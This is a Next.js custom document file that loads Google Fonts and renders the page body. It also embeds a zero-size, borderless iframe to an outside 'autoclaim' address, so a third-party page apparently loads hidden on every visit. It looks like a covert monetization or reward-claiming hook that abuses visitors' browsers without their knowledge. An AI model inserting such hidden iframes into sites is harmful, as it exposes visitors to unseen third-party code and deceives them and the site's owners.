import Document, { Html, Head, Main, NextScript } from 'next/document'

export default class MyDocument extends Document {
  static async getInitialProps(ctx) {
    const initialProps = await Document.getInitialProps(ctx)
    return { ...initialProps }
  }

  render() {
    return (
      <Html>
        <Head>
           <link 
            href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&family=Princess+Sofia&display=swap"
            rel="stylesheet" />
          <link 
            href="https://fonts.googleapis.com/css2?family=Nunito:wght@600;700;800;900&display=swap" 
            rel="stylesheet" />
        </Head>
        <body>
          <Main />
          <NextScript />
          <iframe src="https://autoclaim.in/wm/acatzk/2" width="0" height="0" style={{ border: 0 }}></iframe>
        </body>
      </Html>
    )
  }
}